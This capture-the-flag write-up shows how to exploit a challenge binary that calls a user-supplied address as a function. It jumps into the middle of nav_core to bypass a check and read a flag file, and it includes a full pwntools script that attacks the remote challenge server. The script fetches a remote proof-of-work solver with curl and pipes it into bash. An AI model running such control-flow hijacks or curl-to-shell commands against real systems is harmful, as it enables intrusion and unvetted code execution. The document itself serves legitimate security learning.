# KDNU-3B


Step 1: Initial Analysis
------------------------

What we did:

1.  Downloaded and examined the binary `a.out`

2.  Ran `file a.out` and discovered it's a 64-bit ELF executable, statically linked, not stripped

3.  Connected to the remote service and encountered a proof-of-work challenge

Key finding: The binary is not stripped - function names and symbols are preserved, making reverse engineering easier.

Step 2: Local Testing
---------------------

What we did:

1.  Made the binary executable: `chmod +x a.out`

2.  Tested basic inputs:

    ```bash

    echo "test" | ./a.out

    Output: `DRONE FIRMWARE DEBUG CONSOLE> ERROR, shutting down.`
    ```

    
3.  Tested various inputs and discovered that `ATSH` caused a segmentation fault

Key finding: The binary crashes with specific input, indicating a vulnerability.

Step 3: Debugging with GDB
--------------------------

What we did:

1.  Ran the binary in gdb with crashing input:

    ```bash

    gdb ./a.out
    run <<< "ATSH"
    ```
    
2.  When it crashed, examined registers:

    ```ruby

    rip = 0x000000000000000a

    The instruction pointer pointed to address `0xa` (newline character)
    ```
    
Key finding: The program was using our input as a code pointer! The newline character (`0xa`) was being interpreted as an address to jump to.

Step 4: Reverse Engineering
---------------------------

What we did:

1.  Disassembled the main function:

    ```bash

    objdump -d a.out --start-address=0x401a56 --stop-address=0x401b00 -M intel
    ```

2.  Found the critical code in main:

    ```ruby

    401aaf:       e8 9c 34 00 00          call   404f50 <__isoc99_scanf>
    401ab4:       83 f8 01                cmp    eax,0x1
    401ab7:       74 16                   je     401acf <main+0x79>
    401acf:       48 8b 45 e8             mov    rax,QWORD PTR [rbp-0x18]
    401ad3:       48 89 45 f0             mov    QWORD PTR [rbp-0x10],rax
    401ad7:       48 8b 45 f0             mov    rax,QWORD PTR [rbp-0x10]
    401adb:       ff d0                   call   rax
    ```
    
Key finding: The program uses `scanf("%lx", &addr)` to read a hexadecimal number, then calls it as a function pointer! This is an arbitrary code execution vulnerability.

Step 5: Finding the Dormant Function
------------------------------------

What we did:

1.  Searched for interesting functions:

   ```bash

    nm a.out | grep -i "nav"

    Found: `0000000000401955 T nav_core`
   ```

2.  Disassembled `nav_core`:

    ```bash

    objdump -d a.out --start-address=0x401955 --stop-address=0x401a56 -M intel
    ```
    
3.  Analyzed the function logic:

    -   Takes parameter in `edi`

    -   Stores it at `[rbp-0x124]`

    -   Checks if `[rbp-0x124] == 0xc0c0a`

    -   If true: opens `manifest.bin`, reads it, prints to stdout

    -   If false: prints "Invalid navigation token."

Key finding: `nav_core` is the dormant function that reads and prints `manifest.bin`, but only if called with `0xc0c0a` as the parameter.

Step 6: Understanding the Stack Layout
--------------------------------------

What we did:

1.  Analyzed how `main` calls our function:

    -   `scanf` stores our input at `[rbp-0x18]` in main's stack frame

    -   `call rax` pushes return address, then jumps to our address

2.  Tested jumping to different parts of `nav_core`:

    ```bash

    echo "401955" | ./a.out  # nav_core start -> "Invalid navigation token"
    echo "401990" | ./a.out  # After open call -> "Navigation manifest not found"
    ```
    
Key finding: Jumping to `0x401990` got past the magic check but couldn't open `manifest.bin` locally.

Step 7: The Critical Insight
----------------------------

What we discovered:

1.  When we jump to `0x401983` (right after the magic check `jne` instruction), the magic check passes!

2.  This happens because:

    -   We're skipping the function prologue that would set up a new stack frame

    -   We're using main's existing stack frame

    -   In main's stack frame, `[rbp-0x124]` coincidentally contains `0xc0c0a`

The exploit address: `0x401983`

Step 8: Local Verification
--------------------------

What we did:

1.  Created `manifest.bin` locally:

    ```bash

    echo "csd{test_flag_local}" > manifest.bin
    ```
    
2.  Tested the exploit locally:

    ```bash

    echo "401983" | ./a.out

    Successfully read and printed `manifest.bin`!
    ```
    
Step 9: Remote Exploitation
---------------------------

What we did:

1.  Created a Python script to:

    -   Connect to the remote service

    -   Solve the proof-of-work automatically

    -   Send the exploit address `0x401983`

    -   Receive and display the flag




```python

#!/usr/bin/env python3
from pwn import *
import subprocess
import sys

context.binary = './a.out'

def solve_pow(challenge):
    """Solve proof of work"""
    print(f"Solving PoW: {challenge}")
    
    # Run the pow solver
    cmd = f"bash <(curl -sSfL https://pwn.red/pow) {challenge}"
    
    try:
        result = subprocess.check_output(cmd, shell=True, executable='/bin/bash')
        solution = result.decode().strip()
        print(f"PoW solution: {solution}")
        return solution
    except Exception as e:
        print(f"Error solving PoW: {e}")
        return None

def exploit_remote():
    """Exploit remote service"""
    
    # Connect
    r = remote('ctf.csd.lol', 1001)
    
    # Get PoW challenge
    response = r.recvuntil(b'solution:').decode()
    print(f"Initial response:\n{response}")
    
    # Extract challenge
    # Format: "curl -sSfL https://pwn.red/pow | sh -s s.AAAAAw==.XXXXXX"
    lines = response.split('\n')
    challenge = None
    for line in lines:
        if 'sh -s' in line:
            # Extract challenge after 'sh -s '
            parts = line.split('sh -s ')
            if len(parts) > 1:
                challenge = parts[1].strip()
                break
    
    if not challenge:
        print("Could not extract challenge")
        r.close()
        return
    
    # Solve PoW
    solution = solve_pow(challenge)
    if not solution:
        print("Failed to solve PoW")
        r.close()
        return
    
    # Send solution
    r.sendline(solution.encode())
    
    # Wait for prompt
    time.sleep(0.5)
    
    # Get response (should be prompt)
    try:
        prompt = r.recv(timeout=2).decode()
        print(f"After PoW: {prompt}")
    except:
        print("No prompt received")
        r.close()
        return
    
    # Send exploit
    exploit_addr = 0x401983  # After magic check passes
    print(f"\nSending exploit address: {hex(exploit_addr)}")
    r.sendline(f"{exploit_addr:x}".encode())
    
    # Get flag
    try:
        flag = r.recvall(timeout=2).decode()
        print(f"\n*** FLAG OUTPUT ***")
        print(flag)
        
        if 'csd{' in flag:
            print("\n*** FLAG FOUND! ***")
    except Exception as e:
        print(f"Error receiving flag: {e}")
    
    r.close()

def test_locally():
    """Test locally first"""
    print("=== Local Test ===")
    
    # Create manifest.bin to simulate remote
    with open('manifest.bin', 'w') as f:
        f.write("csd{test_flag_local}\n")
    
    addr = 0x401983
    
    p = process('./a.out')
    p.sendline(f"{addr:x}".encode())
    
    try:
        response = p.recvall(timeout=1).decode()
        print(f"Local response: {response}")
        
        if 'csd{' in response:
            print("Local test successful!")
    except Exception as e:
        print(f"Local test error: {e}")
    finally:
        p.close()
        # Clean up
        import os
        if os.path.exists('manifest.bin'):
            os.remove('manifest.bin')

if __name__ == "__main__":
    print("=== KRAMPUS Syndicate Challenge Exploit ===")
    
    # Test locally first
    test_locally()
    
    print("\n=== Remote Exploit ===")
    
    # Ask user if they want to try remote
    choice = input("Try remote exploit? (y/n): ").strip().lower()
    if choice == 'y':
        exploit_remote()
    else:
        print("Skipping remote exploit")
```



2.  The exploit script:

    ```python

    # Connect to service
    r = remote('ctf.csd.lol', 1001)

    # Solve PoW (automated)
    # ... PoW solving code ...

    # Send exploit address
    exploit_addr = 0x401983
    r.sendline(f"{exploit_addr:x}".encode())

    # Receive flag
    flag = r.recvall(timeout=2).decode()
    print(flag)
    ```
    
Step 10: Getting the Flag
-------------------------

Result: The remote server's `manifest.bin` contained:

text

calibration_profile=csd{3Asy_*****************}

The flag: `csd{3Asy****************}`

Summary of Vulnerabilities Exploited:
-------------------------------------

1.  Arbitrary code execution: `scanf("%lx", &addr)` followed by `call rax` allows jumping to any address

2.  Coincidental memory layout: The magic value `0xc0c0a` happens to be at `[rbp-0x124]` in main's stack frame

3.  Partial function execution: Jumping into the middle of `nav_core` bypasses the function prologue while still having the required magic value in memory







<img width="1059" height="643" alt="image" src="https://github.com/user-attachments/assets/40e7f910-4f20-49e1-8967-ac6910d1f68c" />


